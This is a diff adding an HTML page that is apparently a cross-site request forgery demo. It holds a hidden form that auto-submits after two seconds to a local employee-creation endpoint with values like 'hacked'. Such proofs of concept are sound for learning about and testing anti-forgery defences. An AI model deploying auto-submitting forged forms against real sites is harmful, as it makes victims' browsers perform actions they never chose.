@@ -1,0 +1,31 @@
+﻿<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<meta charset="utf-8" />
+	<title></title>
+</head>
+<body>
+	<form id="testform" style="display:none" action="http://localhost:58769/employee/Create" method="post">
+
+		<input class="form-control text-box single-line" id="Name" name="Name" type="text" value="changed" />
+
+		<select id="Gender" name="Gender">
+
+			<option value="">Select Gender</option>
+			<option selected="selected" value="Male">Male</option>
+			<option value="Female">Female</option>
+		</select>
+
+
+		<input class="form-control text-box single-line" data-val="true" data-val-length="The City must be atleast 6 characters long." data-val-length-max="30" data-val-length-min="6" data-val-required="The City field is required." id="City" name="City" type="text" value="hacked" />
+
+		<input class="form-control text-box single-line" data-val="true" data-val-date="The field DateOfBirth must be a date." data-val-required="The DateOfBirth field is required." id="DateOfBirth" name="DateOfBirth" type="datetime" value="01/12/1987" />
+
+	</form>
+
+	<script>
+		setTimeout(function (){window.testform.submit();},2000);
+		</script>
+</body>
+</html>
